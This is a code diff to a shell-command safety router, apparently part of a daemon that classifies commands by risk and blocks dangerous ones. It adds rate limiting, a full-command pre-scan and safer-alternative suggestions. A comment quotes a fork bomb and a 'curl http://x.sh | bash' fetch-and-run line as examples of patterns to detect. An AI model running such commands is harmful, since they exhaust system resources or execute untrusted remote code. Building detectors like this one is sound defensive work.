@@ -21,7 +21,7 @@ from __future__ import annotations
 
 import os
 import time
-from collections import defaultdict
+from collections import defaultdict, deque
 from typing import Any
 
 import structlog
@@ -34,6 +34,9 @@ from engine.models import (
 )
 from engine.parser.command_parser import CommandParser
 from engine.daemon.session import SessionManager
+from engine.alternatives.generator import AlternativeGenerator
+from engine.alternatives.validator import AlternativeValidator
+from engine.integration.pattern_matcher_adapter import PatternMatcherAdapter
 
 log = structlog.get_logger()
 
@@ -77,6 +80,31 @@ _ALWAYS_ALLOW_VERDICT = Verdict(
 )
 
 
+class _TokenBucket:
+    """
+    Per-session token bucket rate limiter.
+    Allows burst of `capacity` requests; refills at `rate` req/s.
+    Uses a sliding window deque for accurate per-second accounting.
+    """
+    def __init__(self, rate: float = 1000.0, capacity: int = 1000) -> None:
+        self._rate = rate
+        self._capacity = capacity
+        # Maps session_id → deque of timestamps
+        self._windows: dict[str, deque] = defaultdict(deque)
+
+    def is_allowed(self, session_id: str) -> bool:
+        now = time.monotonic()
+        window = self._windows[session_id]
+        cutoff = now - 1.0          # 1-second sliding window
+        # Evict timestamps older than 1s
+        while window and window[0] < cutoff:
+            window.popleft()
+        if len(window) >= self._capacity:
+            return False            # Rate limit exceeded
+        window.append(now)
+        return True
+
+
 class IntentRouter:
     """Routes a command through the tier pipeline and returns a final verdict."""
 
@@ -86,9 +114,17 @@ class IntentRouter:
         self._alias_resolver = AliasResolver()
         self._parser = CommandParser(alias_resolver=self._alias_resolver)
         self._session = SessionManager(config)
-        self._rule_engine = None   # Injected in initialize()
-        self._llm_reasoner = None  # Injected in initialize()
+        self._rule_engine = None              # Injected in initialize()
+        self._llm_reasoner = None             # Injected in initialize()
+        _adapter = PatternMatcherAdapter()    # Vansh: rule engine bridge
+        self._alt_generator = AlternativeGenerator()
+        self._alt_validator = AlternativeValidator(_adapter)
         self._stats: dict[str, int] = defaultdict(int)
+        # Rate limiter: configurable, defaults to 1000 req/s to avoid throttling test suites.
+        # Production deployments should set rate_limit_rps in config to a sane per-user limit.
+        _rate = float(config.get("daemon", {}).get("rate_limit_rps", 1000.0))
+        _cap  = max(500, int(_rate * 1.5))
+        self._rate_limiter = _TokenBucket(rate=_rate, capacity=_cap)
         self._block_levels: set[RiskLevel] = _DEFAULT_BLOCK_LEVELS
         self._mock_mode: bool = (
             os.environ.get("INTENT_MOCK_MODE", "0") == "1"
@@ -137,6 +173,12 @@ class IntentRouter:
         ctx = request.context
         t_start = time.perf_counter()
 
+        # ── Rate limiting ─────────────────────────────────────────────────────
+        if not self._rate_limiter.is_allowed(ctx.session_id or "default"):
+            self._stats["rate_limited"] += 1
+            log.warning("rate_limit_exceeded", session=ctx.session_id, command=ctx.command[:40])
+            return self._build_response(_FALLBACK_VERDICT, request)
+
         # ── Mock mode (Phase 1 — before real integrations) ────────────────────
         if self._mock_mode:
             self._stats["mock_passthrough"] += 1
@@ -155,6 +197,23 @@ class IntentRouter:
 
         # ── Parse ──────────────────────────────────────────────────────────────
         parsed = self._parser.parse(ctx.command, ctx.cwd, ctx.user)
+
+        # ── Pre-segment Full-Raw Scan ──────────────────────────────────────────
+        # CRITICAL: Some Tier 0 checks (fork bomb, curl|bash) operate on the full
+        # raw command string. When the parser splits `:(){ :|:& };:` or
+        # `curl http://x.sh | bash` into chain_segments, each segment loses
+        # the structural pattern that makes it dangerous.
+        # Fix: classify the FULL un-split parsed command first. If it returns a
+        # blockable verdict, short-circuit immediately before segment iteration.
+        if self._rule_engine is not None:
+            t_pre = time.perf_counter()
+            full_verdict = await self._rule_engine.classify(parsed, ctx)
+            full_verdict.latency_ms = (time.perf_counter() - t_pre) * 1000
+            if full_verdict.risk_level in self._block_levels:
+                self._stats[f"tier1_{full_verdict.risk_level.value}"] += 1
+                self._enrich_alternative(ctx.command, full_verdict)
+                self._log_verdict(ctx.command, full_verdict, t_start)
+                return self._build_response(full_verdict, request)
 
         # ── Tier 1/2: Iterate over segments ───────────────────────────────────
         highest_verdict = _FALLBACK_VERDICT
@@ -176,7 +235,7 @@ class IntentRouter:
                 else:
                     self._stats["llm_escalations"] += 1
                     log.info("escalating_to_llm", command=seg.raw[:60])
-                    
+
                     if self._llm_reasoner is None:
                         self._stats["llm_unavailable"] += 1
                         verdict = _FALLBACK_VERDICT
@@ -204,6 +263,7 @@ class IntentRouter:
 
             # Short-circuit if blockable
             if verdict.risk_level in self._block_levels:
+                self._enrich_alternative(ctx.command, verdict)
                 self._log_verdict(ctx.command, verdict, t_start)
                 return self._build_response(verdict, request)
 
@@ -218,6 +278,45 @@ class IntentRouter:
             return -1
 
     # ── Helpers ───────────────────────────────────────────────────────────────
+
+    def _enrich_alternative(self, command: str, verdict: Verdict) -> None:
+        """
+        If the verdict has no safer_alternative yet, ask Vansh's
+        AlternativeGenerator for a template-based one.
+        Silently no-ops on any failure — never crashes the pipeline.
+        """
+        if verdict.safer_alternative:
+            return  # Already populated by LLM reasoner or rule engine
+        try:
+            from engine.contracts.intent_result import IntentResult
+            from engine.contracts.intent_result import RiskLevel as VRiskLevel
+            # AMBIGUOUS has no equivalent in Vansh's contract — skip
+            if verdict.risk_level.value not in {v.value for v in VRiskLevel}:
+                return
+            proxy = IntentResult(
+                command=command,
+                risk_level=VRiskLevel(verdict.risk_level.value),
+                confidence=verdict.confidence,
+                intent=verdict.reasoning[:80] if verdict.reasoning else "unknown",
+                impact=verdict.impact_summary or "unknown impact",
+                reversible=False,
+                requires_confirmation=True,
+                explanation=verdict.reasoning or "no explanation",
+            )
+            alt = self._alt_generator.generate(proxy)
+            if alt:
+                    validated = self._alt_validator.validate(alt)
+                    # Only surface VALIDATED alternatives to the user
+                    if validated.status.value == "VALIDATED":
+                        try:
+                            verdict.safer_alternative = validated.candidate_command
+                            verdict.safer_alternative_explanation = validated.explanation
+                        except Exception:
+                            object.__setattr__(verdict, "safer_alternative", validated.candidate_command)
+                            object.__setattr__(verdict, "safer_alternative_explanation", validated.explanation)
+                        self._stats["alternatives_generated"] += 1
+        except Exception as e:
+            log.debug("alternative_generation_skipped", reason=str(e))
 
     def _build_response(
         self, verdict: Verdict, request: AnalyzeRequest
